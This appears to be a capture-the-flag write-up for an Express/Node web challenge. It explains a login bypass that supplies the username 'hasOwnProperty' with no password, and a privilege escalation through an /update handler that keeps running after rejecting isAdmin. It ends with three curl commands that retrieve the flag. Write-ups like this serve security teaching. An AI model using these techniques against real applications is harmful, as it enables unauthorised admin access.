# Challenge overview
For this web challenge, a simple website has been implemented with Express, which is a lightweight framework for NodeJS servers. 

A user object in the backend is referenced by a name and consists of the fields `name`, `password` and `isAdmin`, 

A client is able to authenticate using the `HTTP POST` endpoint `/login`.

The session is then stored by the server, which then provides a cookie containing the session ID to the client. The following additional functionality is provided once the client has a valid session and can prove this to the server with the aforementioned cookie:
- updating their user object with the `HTTP POST` endpoint `/update`.
- obtaining the flag with the `HTTP GET` endpoint `/flag` (only possible if the user is an admin).

# Finding vulnerabilities
## Client Login
Looking at the server code, it becomes quickly clear that our first step should be to obtain a valid session with the `/login` endpoint, since other endpoints are only reachable after being authenticated.

The following code block poses a first barrier, since we do not know the password of the default user objects created when the server starts:
```JavaScript
const user = users[username];
if (!user || !user.name || user.password !== password)
    return res.status(400).send();
```
However, in addition to declared properties like the three mentioned in the challenge overview, ordinary objects in JavaScript inherit some additional properties, such as `toString`, `hasOwnProperty` etc.. 

In particular, accessing `users["hasOwnProperty"]` will return the inherited function `Object.prototype.hasOwnProperty` instead of undefined or any boolean. That inherited function happens to have a truthy `name` property with the value `"hasOwnProperty"`, which is why the second operand evaluates to `false`.

This gets us past the first two `OR` operands, but in order for `user.password !== password`to also evaluate to `false`, we need to omit the password from the login query. This will work since an `undefined` value will get compared to another `undefined` value.

## Client update and flag
The following vulnerability becomes apparent in the update code:
```JS
const body = req.body;
if (body.isAdmin !== undefined) res.status(400).json({ lmao: "no?" });
Object.assign(users[req.session.username], body);
res.status(204).json({ ok: true });
```
The function does not return after setting the `res` status to 400, which means that the last two lines are reached regardless of the if-block. The line immediately copies properties from the body on to `users[req.session.username]`. 

Later on in the `/flag` endpoint, the `isAdmin` property is read from `users[req.session.username]`, which may contain additional properties that the user controls:
```JavaScript
const user = users[req.session.username];
```

I should note that sending the response after setting the status of `res` the second time can lead to a `header` already sent error, but that will not terminate the Node process.

# An exploit in three steps
Our exploit first creates a valid session with the following `curl` command (replace [X] with the URL of the service):
```bash
curl -i -c cookies.txt -H 'Content-Type: application/json' --data '{"username":"hasOwnProperty"}' [X]/login
```

- `-i` displays the server response header and body.
- `-c cookies.txt` saves the received cookie in the file `cookies.txt`.
- ` -H 'Content-Type: application/json'` tells the server to expect a JSON body
- `--data '{"username":"hasOwnProperty"}'` contains our HTTP body data sent to the server (`curl` will automatically treat this as a `POST` request).

Next, we elevate our privileges as such:
```bash
curl -i -b cookies.txt -H 'Content-Type: application/json' --data '{"isAdmin":1}' [X]/update
```
- `-b cookies.txt` this time sends the cookie we saved before to the server.

We are now free to get the flag, since we have admin privileges:
```bash
curl -i -b cookies.txt -H 'Content-Type: application/json' [X]/flag
```
Note that this `curl` command resolves to a `HTTP GET` per default, since no data is specified.

Using these three steps, we obtain the flag and complete the challenge:
```bash
[...]
flag":"flagbot{tH3_PR0totype_CH4in_15_a_WoNdeRfU1_thing_anD_br1N6s_n0_i55ue5_wha7s0eV3r}
```